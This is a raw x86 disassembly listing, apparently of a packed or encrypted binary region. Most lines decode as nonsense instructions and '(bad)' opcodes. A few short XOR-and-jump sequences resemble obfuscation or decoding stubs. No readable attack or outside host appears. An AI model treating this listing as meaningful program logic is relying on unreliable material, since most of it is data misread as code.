  407aab:	test   BYTE PTR [eax+esi*4+0x3d81bd8e],bl
  407ab2:	xchg   ebx,eax
  407ab3:	das    
  407ab4:	adc    BYTE PTR [edx],bh
  407ab6:	pop    ebx
  407ab7:	mov    es,WORD PTR [edi]
  407ab9:	(bad)  
  407aba:	pop    ss
  407abb:	(bad)  
  407abd:	sahf   
  407abe:	fs arpl WORD PTR ss:0xfd62b1af,di
  407ac6:	cwde   
  407ac7:	and    eax,0xa8f2ff23
  407acc:	rol    BYTE PTR [esi],0x3b
  407acf:	push   edx
  407ad0:	xlat   BYTE PTR ds:[ebx]
  407ad1:	pop    ds
  407ad2:	cmp    DWORD PTR [edi],esi
  407ad4:	aas    
  407ad5:	xchg   WORD PTR [ebp-0x7e87555c],sp
  407adc:	mov    edi,DWORD PTR [eax-0x4315c37e]
  407ae2:	dec    edx
  407ae3:	dec    eax
  407ae4:	push   edi
  407ae5:	int    0xa1
  407ae7:	jne    0x407b57
  407ae9:	jb     0x407ad2
  407aeb:	mov    eax,0x95efe8df
  407af0:	push   edx
  407af1:	jecxz  0x407af3
  407af3:	or     BYTE PTR [edi+0x3dbcf1a1],dh
  407af9:	outs   dx,DWORD PTR ds:[esi]
  407afa:	fwait
  407afb:	mov    eax,DWORD PTR [ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	imul   ebp,ecx,0xd659d7b8
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407ac1
  407b40:	test   al,0xd2
  407b42:	mov    ebp,0x2f1a0455
  407b47:	inc    ecx
  407b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b49:	(bad)  
  407b4a:	pop    esp
  407b4b:	(bad)  
  407b4c:	out    dx,eax
  407b4d:	in     eax,0x35
  407b4f:	nop
  407b50:	or     al,0x23
  407b52:	repz fcmovne st,st(5)
  407b55:	test   dl,dh
  407b57:	outs   dx,BYTE PTR ds:[esi]
  407b58:	jbe    0x407b72
  407b5a:	fsubrp st(7),st
  407b5c:	pop    eax
  407b5d:	adc    ebp,DWORD PTR [edx]
  407b5f:	mov    esp,0xacb65709
  407b64:	xchg   BYTE PTR fs:0x5c6264df,dl
  407b6b:	iret   
  407b6c:	imul   ecx,DWORD PTR [esi],0xd948ddab
  407b72:	mov    dh,0x44
  407b74:	scas   eax,DWORD PTR es:[edi]
  407b75:	xlat   BYTE PTR cs:[ebx]
  407b77:	push   ebp
  407b78:	push   cs
  407b79:	push   0xffffff94
  407b7b:	mov    ebx,0xd3c7218e
  407b80:	gs jno 0x407b4c
  407b83:	jnp    0x407b87
  407b85:	scas   al,BYTE PTR es:[edi]
  407b86:	xchg   BYTE PTR [ebp+0x22],al
  407b89:	(bad)
  407b8c:	aam    0xc3
  407b8e:	cwde   
  407b8f:	mov    esp,0xc45580f3
  407b95:	cmp    DWORD PTR [ecx],ebx
  407b97:	ins    BYTE PTR es:[edi],dx
  407b98:	mov    ch,0xce
  407b9a:	inc    ebx
  407b9b:	fild   QWORD PTR [ecx-0x1d77b01e]
  407ba1:	push   ecx
  407ba2:	mov    ebx,cs
  407ba4:	pshufw mm5,QWORD PTR [edx-0x7b],0x29
  407ba9:	add    al,0x1f
  407bab:	pop    edx
  407bac:	push   0x99b95f9d
  407bb1:	fidiv  DWORD PTR [esi]
  407bb3:	add    BYTE PTR [edx-0x55],bh
  407bb6:	add    al,cl
  407bb8:	daa    
  407bb9:	daa    
  407bba:	pop    DWORD PTR [edi+0x7d39db63]
  407bc0:	sbb    eax,0x7c6e0c49
  407bc5:	je     0x407bb8
  407bc7:	xchg   edx,eax
  407bc8:	comiss xmm5,xmm3
  407bcb:	add    BYTE PTR [ebx-0x2],dl
  407bce:	jb     0x407c3c
  407bd0:	jge    0x407c30
  407bd2:	or     BYTE PTR [eax+0x6d],ch
  407bd5:	adc    eax,0x2b52416c
  407bda:	and    edi,eax
  407bdc:	mov    edi,0xb5b897fd
  407be1:	call   0x1c07235d
  407be6:	aaa    
  407be7:	or     al,0xb6
  407be9:	out    dx,al
  407bea:	cs out 0x30,al
  407bed:	ins    DWORD PTR es:[edi],dx
  407bee:	mov    ds:0x98627825,eax
  407bf3:	push   es
  407bf4:	dec    ebx
  407bf5:	pop    ds
  407bf6:	repnz xchg ecx,eax
  407bf8:	add    DWORD PTR [edx],0xffffffd7
  407bfb:	hlt    
  407bfc:	xor    DWORD PTR [edx+0x55],esi
  407bff:	shl    ebp,0x2a
  407c02:	or     DWORD PTR [esi],esp
  407c04:	jb     0x407c29
  407c06:	(bad)  
  407c08:	mov    al,BYTE PTR [edi-0x5a91dd78]
  407c0e:	jge    0x407c4d
  407c10:	push   esp
  407c11:	mov    esp,0xd3056e6a
  407c16:	pop    ecx
  407c17:	mov    edi,0x8862dd0b
  407c1c:	mov    bh,0xf9
  407c1e:	pop    esp
  407c1f:	or     eax,DWORD PTR [esi]
  407c21:	sbb    al,0x23
  407c23:	sub    bl,BYTE PTR ds:0x78b7cf2a
  407c29:	in     eax,0x6
  407c2b:	out    0xff,al
  407c2d:	pop    ebx
  407c2e:	adc    edi,DWORD PTR [ebp+0x376cbf47]
  407c34:	shl    BYTE PTR [ebp-0x1eaf675d],1
  407c3a:	cs ins BYTE PTR es:[edi],dx
  407c3c:	fstp   QWORD PTR [ecx+ebx*8]
  407c3f:	or     eax,DWORD PTR fs:[eax+0x26a3227b]
  407c46:	iret   
  407c47:	(bad)  [edi+0x6422f7b3]
  407c4d:	addr16 add eax,0xbe343a69
  407c53:	pop    ecx
  407c54:	adc    BYTE PTR [ebx-0x41b5b3c9],ah
  407c5a:	mov    edi,0x373fbc83
  407c5f:	pop    edi
  407c60:	xchg   ebp,eax
  407c61:	addr16 mov esi,0xc77fcc13
  407c67:	sbb    esi,DWORD PTR [eax+0x2e]
  407c6a:	pop    ebp
  407c6b:	outs   dx,BYTE PTR ds:[esi]
  407c6c:	mov    eax,0x37bc53ff
  407c71:	test   ebp,ecx
  407c73:	stos   BYTE PTR es:[edi],al
  407c74:	or     dh,BYTE PTR [edi]
  407c76:	lods   al,BYTE PTR ds:[esi]
  407c77:	es mov ecx,0xe0b62e5
  407c7d:	(bad)  
  407c7e:	pop    esp
  407c7f:	and    ebp,DWORD PTR [edi-0x649457eb]
  407c85:	push   edi
  407c86:	sahf   
  407c87:	cdq    
  407c88:	sbb    DWORD PTR [ebp-0x1e1c6916],esp
  407c8e:	mov    dh,0xed
  407c90:	or     al,0xe5
  407c92:	rol    ch,0xd9
  407c95:	(bad)  
  407c96:	xchg   BYTE PTR [edx],cl
  407c98:	xor    DWORD PTR [edx],edx
  407c9a:	cmp    esp,eax
  407c9c:	adc    eax,0x45aee8a8
  407ca1:	fld    TBYTE PTR [eax]
  407ca3:	(bad)  
  407ca4:	or     al,0xcf
  407ca6:	cmp    al,BYTE PTR [ebp+0x29f065d3]
  407cac:	push   edx
  407cad:	mov    ch,0x63
  407caf:	fbld   TBYTE PTR [ebp-0x69]
  407cb2:	sahf   
  407cb3:	mov    cl,0x4c
  407cb5:	fcomp  QWORD PTR [ecx+0x76]
  407cb8:	loop   0x407d19
  407cba:	push   0xffffffdf
  407cbc:	sbb    eax,0x9e5c97d9
  407cc1:	addr16 adc eax,0x75a086f7
  407cc7:	rol    BYTE PTR [edx+0x59],0x70
  407ccb:	test   BYTE PTR [eax+0x211f6dfc],ch
  407cd1:	sbb    DWORD PTR [esi+0x57b2aafe],edx
  407cd7:	sbb    dl,BYTE PTR [edx]
  407cd9:	hlt    
  407cda:	retf   0x8879
  407cdd:	shl    BYTE PTR [edi+0x2e],0xb2
  407ce1:	jl     0x407d39
  407ce3:	(bad)  
  407ce4:	aas    
  407ce5:	outs   dx,DWORD PTR ds:[esi]
  407ce6:	adc    ecx,DWORD PTR [ebx+0x1097159d]
  407cec:	dec    edx
  407ced:	adc    ch,BYTE PTR [edx+0x19ce481f]
  407cf3:	sub    al,0x80
  407cf5:	sti    
  407cf6:	pop    es
  407cf7:	inc    ebx
  407cf8:	mov    ch,0x2d
  407cfa:	jg     0x407d67
  407cfc:	imul   esp,DWORD PTR [ecx],0x3f526b41
  407d02:	lock in eax,0x10
  407d05:	lock cwde 
  407d07:	or     DWORD PTR [ebx+0x458a24fb],0xffffffac
  407d0e:	jle    0x407d59
  407d10:	ds jmp 0xd182:0xebca78e
  407d18:	daa    
  407d19:	mov    ds:0xd3836ff7,al
  407d1e:	mov    ds:0xd8db91a1,al
  407d23:	mov    esi,0x2fa4b0a0
  407d28:	jg     0x407cba
  407d2a:	out    0x8c,eax
  407d2c:	add    esp,DWORD PTR [eax+0x39]
  407d2f:	sub    eax,DWORD PTR [esi+0xe]
  407d32:	mov    gs,eax
  407d34:	cli    
  407d35:	mov    eax,ds:0x884c5318
  407d3a:	sub    edi,DWORD PTR [edi]
  407d3c:	jno    0x407db8
  407d3e:	mov    dh,0x29
  407d40:	lahf   
  407d41:	jl     0x407cc9
  407d43:	nop
  407d44:	or     ch,ch
  407d46:	ins    DWORD PTR es:[edi],dx
  407d47:	ret    
  407d48:	lock cmc 
  407d4a:	adc    eax,eax
  407d4c:	fistp  DWORD PTR [ecx+0x2b]
  407d4f:	push   esp
  407d50:	cld    
  407d51:	mov    dl,0x9f
  407d53:	(bad)  
  407d54:	iret   
  407d55:	sahf   
  407d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d57:	ss retf 
  407d59:	(bad)  [esi]
  407d5b:	xchg   esi,eax
  407d5c:	mov    ds:0x12fba59e,al
  407d61:	outs   dx,DWORD PTR ds:[esi]
  407d62:	(bad)  
  407d63:	xlat   BYTE PTR ds:[ebx]
  407d64:	adc    esi,DWORD PTR [edx-0x7b]
  407d67:	cmp    eax,0xc4e7c49d
  407d6c:	fadd   QWORD PTR [edi-0x73]
  407d6f:	xor    bh,BYTE PTR [esi]
  407d71:	cmp    ebp,esp
  407d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d74:	mov    ebx,0xad0b3773
  407d79:	inc    ecx
  407d7a:	sub    ch,dl
  407d7c:	imul   ebx,eax,0xffffff8a
  407d7f:	jnp    0x407dd7
  407d81:	pop    es
  407d82:	loop   0x407d67
  407d84:	push   0x3f
  407d86:	mov    bl,0x73
  407d88:	mov    ah,0xc4
  407d8a:	mov    dl,BYTE PTR [esi-0xb713c46]
  407d90:	stos   DWORD PTR es:[edi],eax
  407d91:	(bad)  
  407d92:	shr    DWORD PTR [ecx],1
  407d94:	inc    eax
  407d95:	push   ecx
  407d96:	dec    ebp
  407d97:	fwait
  407d98:	ds pop eax
  407d9a:	std    
  407d9b:	adc    DWORD PTR [ebx+0x54],0xffffffd1
  407d9f:	xor    edx,ebx
  407da1:	rol    al,1
  407da3:	ret    
  407da4:	mov    ebx,0x932c98cd
  407da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407daa:	push   esi
  407dab:	call   0x743a:0x7e207395
  407db2:	xchg   ebp,eax
  407db3:	in     eax,0x36
  407db5:	repz dec edi
  407db7:	cmc    
  407db8:	xor    eax,DWORD PTR [eax-0x19083638]
  407dbe:	stos   DWORD PTR es:[edi],eax
  407dbf:	or     DWORD PTR [ecx-0x38],0x54
  407dc3:	fcom   QWORD PTR [eax]
  407dc5:	xchg   esi,ecx
  407dc7:	cs aad 0xf1
  407dca:	xor    bl,bh
  407dcc:	mov    al,ds:0x5e5dfae1
  407dd1:	and    BYTE PTR [ebx+0xf],al
  407dd4:	outs   dx,DWORD PTR ds:[esi]
  407dd5:	push   eax
  407dd6:	mov    bl,0x75
  407dd8:	jbe    0x407dd1
  407dda:	xchg   edx,eax
  407ddb:	add    DWORD PTR [edi-0x16c7fdf1],ebp
  407de1:	jmp    0x5d8e36f3
  407de6:	jl     0x407e1b
  407de8:	push   eax
  407de9:	xchg   edi,eax
  407dea:	sub    eax,0xa7eb27be
  407def:	pop    ebx
  407df0:	adc    eax,0x8e954dd0
  407df5:	ds jb  0x407e13
  407df8:	in     eax,0xb5
  407dfa:	xor    al,0xf2
  407dfc:	mov    bh,0x14
  407dfe:	and    esp,DWORD PTR [ecx+esi*4]
  407e01:	lods   eax,DWORD PTR ds:[esi]
  407e02:	das    
  407e03:	int    0xf3
  407e05:	sub    BYTE PTR [edx],ah
  407e07:	sub    edx,0xffffffa5
  407e0a:	mov    al,ds:0x3283ecb8
  407e0f:	fstp   DWORD PTR [edx-0x31]
  407e12:	es ret 0x3ed7
  407e16:	idiv   dh
  407e18:	jmp    0x728dc479
  407e1d:	or     al,0x7f
  407e1f:	and    al,0x6e
  407e21:	jbe    0x407e9f
  407e23:	sbb    BYTE PTR [esi],cl
  407e25:	pop    esp
  407e26:	(bad)  
  407e27:	addr16 ds hlt 
  407e2a:	nop
  407e2b:	xor    eax,0xbc07f9ed
  407e30:	inc    ebx
  407e31:	sub    esp,DWORD PTR [edi-0x6f874210]
  407e37:	jge    0x407eb1
  407e39:	scas   eax,DWORD PTR es:[edi]
  407e3a:	outs   dx,DWORD PTR ds:[esi]
  407e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e3c:	xchg   esp,eax
  407e3d:	or     al,0x58
  407e3f:	rcr    BYTE PTR [ebp+edx*2-0x448be992],0x47
  407e47:	loop   0x407e00
  407e49:	mov    esp,0x909eaa54
  407e4e:	jmp    0x407e66
  407e50:	nop
  407e51:	mov    edi,0x2c2763d5
  407e56:	ss int 0xd0
  407e59:	cmp    al,BYTE PTR [ebx+0xc]
  407e5c:	shr    BYTE PTR [bp+di-0x13],0x31
  407e61:	xchg   edi,eax
  407e62:	sub    edx,DWORD PTR [edx]
  407e64:	fistp  QWORD PTR [edx+0x40]
  407e67:	pop    edx
  407e68:	jb     0x407ded
  407e6a:	mov    ebx,0x94ebd130
  407e6f:	mov    al,ds:0x543d8d70
  407e74:	or     DWORD PTR [ebx],esi
  407e76:	(bad)  
  407e77:	out    0x30,al
  407e79:	aad    0xc5
  407e7b:	fld1   
  407e7d:	loopne 0x407e04
  407e7f:	jmp    0x407e87
  407e81:	sub    al,0x3e
  407e83:	rcr    esi,0xbf
  407e86:	pop    ebx
  407e87:	cld    
  407e88:	in     eax,0x9f
  407e8a:	jne    0x407ebb
  407e8c:	jnp    0x407e8a
  407e8e:	push   eax
  407e8f:	mov    bh,0x3e
  407e91:	(bad)  
  407e92:	std    
  407e93:	call   DWORD PTR [ebx]
  407e95:	fdiv   DWORD PTR [ecx]
  407e97:	fld    QWORD PTR [ecx]
  407e99:	add    ecx,DWORD PTR [edx-0x2f3512ac]
  407e9f:	lea    edi,[esi-0x5296b56c]
  407ea5:	rep lods eax,DWORD PTR ds:[esi]
  407ea7:	or     eax,DWORD PTR [edx+esi*2]
  407eaa:	xor    al,0x2e
  407eac:	daa    
  407ead:	retf   0xfcde
  407eb0:	push   eax
  407eb1:	pop    ds
  407eb2:	rol    BYTE PTR [edi],0xac
  407eb5:	and    eax,DWORD PTR [ecx]
  407eb7:	fidivr DWORD PTR [esp+ebx*2+0x2aa1d497]
  407ebe:	cs ds push esi
  407ec1:	inc    ebp
  407ec2:	ds push 0x1f5977
  407ec8:	inc    ebx
  407ec9:	sbb    BYTE PTR [ecx+0x127c41e7],cl
  407ecf:	xor    dh,cl
  407ed1:	fbld   TBYTE PTR [edx+0x79a9c21a]
  407ed7:	push   cs
  407ed8:	cmp    edx,DWORD PTR [ecx+0x53af4ff7]
  407ede:	pop    ebx
  407edf:	bound  edi,QWORD PTR [edx-0x3f4f20cf]
  407ee5:	cmp    bh,dh
  407ee7:	mov    al,ds:0xd0142d4b
  407eec:	out    0xd2,al
  407eee:	mov    esi,0xe4709dc1
  407ef3:	imul   eax,DWORD PTR [ecx-0x3b],0xd0d708ab
  407efa:	push   cs
  407efb:	pop    ebx
  407efc:	push   0xaa4fbeaf
  407f01:	dec    ecx
  407f02:	sbb    esp,DWORD PTR [edi]
  407f04:	ds cld 
  407f06:	mov    ch,0xaf
  407f08:	out    dx,al
  407f09:	inc    BYTE PTR [ebx]
  407f0b:	aaa    
  407f0c:	mov    eax,ds:0x6683e89c
  407f11:	cmp    eax,DWORD PTR [edi]
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407f79
  407f78:	inc    edx
  407f79:	sub    DWORD PTR [edi],esi
  407f7b:	stos   BYTE PTR es:[edi],al
  407f7c:	sar    BYTE PTR [esi+0x7e],cl
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407fe6
  407f84:	sahf   
  407f85:	mov    esp,0xe9c6dd7d
  407f8a:	jmp    0xbba518f2
  407f8f:	mov    esp,0xcaf62ab3
  407f94:	fcmovnu st,st(1)
  407f96:	mov    es,ebp
  407f98:	and    eax,0x623245b2
  407f9d:	fldenv [eax+0x0]
  407fa0:	enter  0x41e1,0xd9
  407fa4:	xor    DWORD PTR [edi],0x1894d288
  407faa:	cli    
  407fab:	in     al,0xe1
  407fad:	and    eax,0x901f7635
  407fb2:	(bad)  
  407fb3:	outs   dx,BYTE PTR ds:[esi]
  407fb4:	xchg   edi,eax
  407fb5:	pusha  
  407fb6:	test   al,0x4f
  407fb8:	imul   eax,DWORD PTR [edx+0x21],0x861e172e
  407fbf:	test   BYTE PTR [edi+0x3a],ch
  407fc2:	adc    DWORD PTR [ebx-0x7e54ce99],esp
  407fc8:	popa   
  407fc9:	bound  edi,QWORD PTR [ecx-0x236ba1ac]
  407fcf:	shl    cl,0xff
  407fd2:	adc    BYTE PTR [edx],dl
  407fd4:	loopne 0x407fbb
  407fd6:	xchg   esp,eax
  407fd7:	out    dx,al
  407fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fd9:	inc    ebp
  407fda:	dec    edi
  407fdb:	out    dx,al
  407fdc:	push   cs
  407fdd:	retf   
  407fde:	aaa    
  407fdf:	shl    BYTE PTR [esi+ecx*8+0xe],1
  407fe3:	fidivr DWORD PTR [ecx+eax*4-0x5ddfe70b]
  407fea:	(bad)  
  407feb:	shr    BYTE PTR [ecx],cl
  407fed:	hlt    
  407fee:	xchg   esp,eax
  407fef:	out    0x4e,al
  407ff1:	rcl    DWORD PTR [esi-0x65],1
  407ff4:	and    DWORD PTR [edi-0x4ad42b2d],esp
  407ffa:	ins    DWORD PTR es:[edi],dx
  407ffb:	loopne 0x40802d
  407ffd:	stos   BYTE PTR es:[edi],al
  407ffe:	adc    al,0x20
  408000:	xor    DWORD PTR [eax-0x70886892],ebx
  408006:	pop    eax
  408007:	jp     0x40807b
  408009:	pop    esp
  40800a:	adc    edx,DWORD PTR [edi+0x37]
  40800d:	ins    DWORD PTR es:[edi],dx
  40800e:	scas   eax,DWORD PTR es:[edi]
  40800f:	mov    DWORD PTR [bp+di+0x4076],edx
  408014:	data16 adc BYTE PTR [esi+0x1a22de12],ah
  40801b:	jno    0x408094
  40801d:	inc    edi
  40801e:	retf   0x6df7
  408021:	inc    edx
  408022:	inc    esi
  408023:	pop    eax
  408024:	or     DWORD PTR [ebp-0x576ea163],0xffffff89
  40802b:	retf   
  40802c:	addr16 dec ecx
  40802e:	fsub   st,st(0)
  408030:	cmp    al,bl
  408032:	aad    0xfa
  408034:	xor    DWORD PTR ds:0xc2c626b7,esi
  40803a:	icebp  
  40803b:	ins    DWORD PTR es:[edi],dx
  40803c:	mov    ebx,DWORD PTR [edi]
  40803e:	mov    ch,0x62
  408040:	setp   bh
  408043:	sbb    al,0x77
  408045:	test   BYTE PTR [ebx],cl
  408047:	stc    
  408048:	cld    
  408049:	test   eax,0xadf1470e
  40804e:	push   esp
  40804f:	stos   BYTE PTR es:[edi],al
  408050:	mov    bh,0xbf
  408052:	not    BYTE PTR [esi-0x770d940c]
  408058:	js     0x40808f
  40805a:	pop    edi
  40805b:	dec    esp
  40805c:	xchg   ecx,eax
  40805d:	mov    esi,0x637cc924
  408062:	adc    DWORD PTR [edi-0xd3635a],esp
  408068:	pop    esp
  408069:	mov    ebx,0x32297089
  40806e:	cmp    BYTE PTR [edx+0x4],ch
  408071:	xor    BYTE PTR [ecx-0x35f2d9dd],bh
  408077:	jmp    0x3bb9:0xcfcddd8a
  40807e:	leave  
  40807f:	mov    ss,WORD PTR [eax]
  408081:	stos   DWORD PTR es:[edi],eax
  408082:	xor    esp,DWORD PTR [edi]
  408084:	pop    esp
  408085:	sub    ebp,ebp
  408087:	sbb    bl,BYTE PTR ds:0x48283994
  40808d:	push   edx
  40808e:	xor    DWORD PTR [edi-0x16],ebx
  408091:	mov    ebp,0x98501056
  408096:	scas   al,BYTE PTR es:[edi]
  408097:	xchg   edx,eax
  408098:	or     ch,BYTE PTR [ecx+0x76]
  40809b:	mov    eax,ds:0x89c12150
  4080a0:	lods   al,BYTE PTR ds:[esi]
  4080a1:	out    dx,al
  4080a2:	xchg   ecx,eax
  4080a3:	add    BYTE PTR [edx+ebx*8],dl
  4080a6:	cmc    
  4080a7:	or     DWORD PTR [ebx+0x12408705],ebp
  4080ad:	jge    0x408085
  4080af:	adc    eax,0x88d5f7a1
  4080b4:	sbb    edi,DWORD PTR [edx]
  4080b6:	mov    DWORD PTR [esi+edx*4+0x22],eax
  4080ba:	sbb    edx,DWORD PTR [ebx-0x68]
  4080bd:	inc    esp
  4080be:	mov    ah,BYTE PTR [eax-0x1dfa3123]
  4080c4:	push   ebp
  4080c5:	stos   BYTE PTR es:[edi],al
  4080c6:	xchg   DWORD PTR [ebx+esi*1-0x57de952b],edx
  4080cd:	sbb    edx,DWORD PTR [esi]
  4080cf:	push   edx
  4080d0:	push   esp
  4080d1:	sbb    al,0xf0
  4080d3:	xchg   esp,eax
  4080d4:	push   ecx
  4080d5:	neg    DWORD PTR [eax]
  4080d7:	aaa    
  4080d8:	aas    
  4080d9:	xchg   esp,eax
  4080da:	popa   
  4080db:	std    
  4080dc:	add    esp,esi
  4080de:	jbe    0x40814f
  4080e0:	adc    BYTE PTR [esi-0x3b],al
  4080e3:	imul   ecx,DWORD PTR [ebx],0x2b
  4080e6:	aad    0x8f
  4080e8:	js     0x4080c9
  4080ea:	sub    bh,BYTE PTR ds:0x8164d57c
  4080f0:	aad    0x9c
  4080f2:	jnp    0x408134
  4080f4:	frstor [ebx]
  4080f6:	or     ebx,DWORD PTR [edx+0x258d2033]
  4080fc:	fld    QWORD PTR [ebp+0x73]
  4080ff:	sbb    ecx,esp
  408101:	js     0x4080d7
  408103:	inc    ebp
  408104:	jns    0x4080be
  408106:	dec    edi
  408107:	hlt    
  408108:	fadd   DWORD PTR [eax-0x78f3f01a]
  40810e:	(bad)  
  40810f:	cmp    BYTE PTR [esi+edx*8-0x2f410425],cl
  408116:	mov    ah,0xde
  408118:	rol    bl,0x27
  40811b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40811c:	xchg   edi,eax
  40811d:	xchg   BYTE PTR [ecx-0x257fd709],bh
  408123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408124:	pop    ds
  408125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408126:	add    eax,0x3d1c40c
  40812b:	xor    al,0xd7
  40812d:	lods   eax,DWORD PTR ds:[esi]
  40812e:	xor    BYTE PTR [ebp+0x1b076317],0x9e
  408135:	mov    edi,0x90ccebf8
  40813a:	dec    eax
  40813b:	lods   eax,DWORD PTR ds:[esi]
  40813c:	inc    esp
  40813d:	popf   
  40813e:	push   ecx
  40813f:	pop    ebx
  408140:	inc    esp
  408141:	mov    ds:0xdf64f1c7,al
  408146:	mov    esp,0x9cf789b6
  40814b:	sbb    al,0x96
  40814d:	xor    BYTE PTR [esi+0x5c],bl
  408150:	icebp  
  408151:	cmp    esp,DWORD PTR [edx]
  408153:	jg     0x4081bc
  408155:	inc    edi
  408156:	mov    ds:0x84dcef49,eax
  40815b:	pushf  
  40815c:	daa    
  40815d:	add    eax,0xd60ded14
  408162:	(bad)  
  408163:	fcomp  QWORD PTR [esi]
  408165:	mov    edi,0xbacd439b
  40816a:	sbb    DWORD PTR [edx],edx
  40816c:	mov    ch,dh
  40816e:	adc    DWORD PTR [ebp-0x4a575df6],ebp
  408174:	(bad)  
  408175:	cmc    
  408176:	sbb    dh,BYTE PTR [eax]
  408178:	out    dx,eax
  408179:	fstp   DWORD PTR [esp+edx*2-0x5f]
  40817d:	adc    BYTE PTR [esi+0x38e99f68],0x49
  408184:	mov    ebp,0x73d36470
  408189:	call   FWORD PTR [ecx]
  40818b:	jl     0x4081b3
  40818d:	and    al,0x51
  40818f:	mov    bh,0xfa
  408191:	test   DWORD PTR ds:0x8876a06,ebp
  408197:	repz shl BYTE PTR [ebp+0x1afc91d2],0xb1
  40819f:	cld    
  4081a0:	in     al,dx
  4081a1:	add    esp,DWORD PTR cs:[esi+eiz*4+0x7ec700f5]
  4081a9:	dec    ebp
  4081aa:	imul   ebx,DWORD PTR [ecx-0x3],0xa8234200
  4081b1:	jg     0x4081d9
  4081b3:	mov    eax,0x601cc4ab
  4081b8:	out    0x9,eax
  4081ba:	das    
  4081bb:	aam    0xf6
  4081bd:	jle    0x4081c9
  4081bf:	test   al,0x9b
  4081c1:	je     0x4081fe
  4081c3:	in     al,dx
  4081c4:	out    dx,al
  4081c5:	daa    
  4081c6:	dec    ebp
  4081c7:	and    ch,dl
  4081c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ca:	add    ebx,DWORD PTR ds:0x2deb2306
  4081d0:	mov    al,ds:0xac677402
  4081d5:	or     dh,BYTE PTR ds:0x481d50ab
  4081db:	loopne 0x4081f4
  4081dd:	mov    al,ds:0xd578301f
  4081e2:	pop    esi
  4081e3:	mov    esi,0xd25b432d
  4081e8:	jmp    0x32637ec8
  4081ed:	and    al,0xc0
  4081ef:	jmp    0x408259
  4081f1:	aas    
  4081f2:	inc    edi
  4081f3:	and    cl,ch
  4081f5:	mov    bh,0xee
  4081f7:	mov    bl,0x96
  4081f9:	in     al,dx
  4081fa:	jge    0x4081cb
  4081fc:	mov    ah,0x36
  4081fe:	lods   eax,DWORD PTR ds:[esi]
  4081ff:	xor    eax,0xc0945ec7
  408204:	xor    BYTE PTR [esi-0x4b],ah
  408207:	jns    0x4081b0
  408209:	mov    dl,0x39
  40820b:	sahf   
  40820c:	lods   al,BYTE PTR ds:[esi]
  40820d:	dec    esp
  40820e:	sar    BYTE PTR [ebp-0x7a],0xdc
  408212:	mov    ah,0xe5
  408214:	dec    edx
  408215:	outs   dx,BYTE PTR ds:[esi]
  408216:	push   esi
  408217:	mov    ds:0xc973c230,eax
  40821c:	inc    eax
  40821d:	inc    esi
  40821e:	retf   
  40821f:	mov    ch,cl
  408221:	or     edx,ebx
  408223:	add    bl,BYTE PTR [eax+esi*1+0x0]
  408227:	mov    ebx,0x402a8faf
  40822c:	or     BYTE PTR [edi],dh
  40822e:	mov    dl,0x95
  408230:	pop    esp
  408231:	cmp    eax,0xf373f01a
  408236:	leave  
  408237:	pop    esp
  408238:	popa   
  408239:	jns    0x4082a4
  40823b:	sbb    eax,0x30743106
  408240:	jns    0x4081d2
  408242:	test   eax,0x4cf686d8
  408247:	jmp    0xb537:0x7c43f200
  40824e:	and    eax,0x4f607e88
  408253:	aam    0xa5
  408255:	(bad)
  408259:	xchg   edx,eax
  40825a:	cmp    ch,bl
  40825c:	cld    
  40825d:	jno    0x4081e2
  40825f:	dec    ebp
  408260:	sahf   
  408261:	(bad)  
  408262:	call   0x380c4c3b
  408267:	sub    BYTE PTR [ecx+0xed0c6c7],bh
  40826d:	jmp    0x269df277
  408272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408273:	xlat   BYTE PTR ds:[ebx]
  408274:	test   DWORD PTR ds:0xe26da62f,eax
  40827a:	push   cs
  40827b:	jbe    0x408263
